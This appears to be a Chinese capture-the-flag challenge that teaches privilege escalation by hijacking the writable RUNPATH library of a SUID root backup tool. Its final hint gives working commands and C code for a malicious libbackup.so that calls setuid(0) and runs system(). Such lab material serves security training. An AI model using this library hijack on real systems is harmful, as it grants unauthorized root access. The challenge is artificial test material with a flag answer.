# 第 10 题：SUID 叠加库劫持（RPATH 指向可写目录）

## 场景

这是一台**备份服务器**。运维部署了一个 SUID root 的备份工具
`/opt/backup/bin/backup-tool`，它依赖一个共享库 `libbackup.so`。

这个库的搜索路径被编译进了程序里（run-time search path），而那个目录对运维组是**可写的**。
你（`player`）恰好就在运维组（`ops`）里。

## 目标

拿到 root 权限，读取 `/flag.txt`：

```bash
cat /flag.txt
```

## 登录

```bash
ssh -p 22010 player@<主机IP>
# 密码：Player@2026
```

## 提示

1. 先找到这个 SUID 程序并运行一次：
   ```bash
   find / -perm -4000 -type f 2>/dev/null | grep backup
   /opt/backup/bin/backup-tool
   ```
2. 它依赖哪个共享库？搜索路径是什么？
   ```bash
   ldd /opt/backup/bin/backup-tool
   readelf -d /opt/backup/bin/backup-tool | head
   ```
3. 那个路径（`RUNPATH`）指向的目录，**你能不能写**？
   ```bash
   id
   ls -ld /opt/backup/lib
   ```
4. 如果同一个名字的库被替换，下一次运行会加载谁的？
   把库换成一个“执行命令”的版本：
   ```bash
   cat > /tmp/evil.c <<'EOF'
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   int backup_run(void) { setuid(0); setgid(0); system("id; cat /flag.txt"); return 0; }
   EOF
   gcc -shared -fPIC -o /tmp/libbackup.so /tmp/evil.c
   cp /tmp/libbackup.so /opt/backup/lib/libbackup.so
   /opt/backup/bin/backup-tool
   ```

## 评分

成功 `cat /flag.txt` 得到 `Ly_Flag{...}` 即为通过。
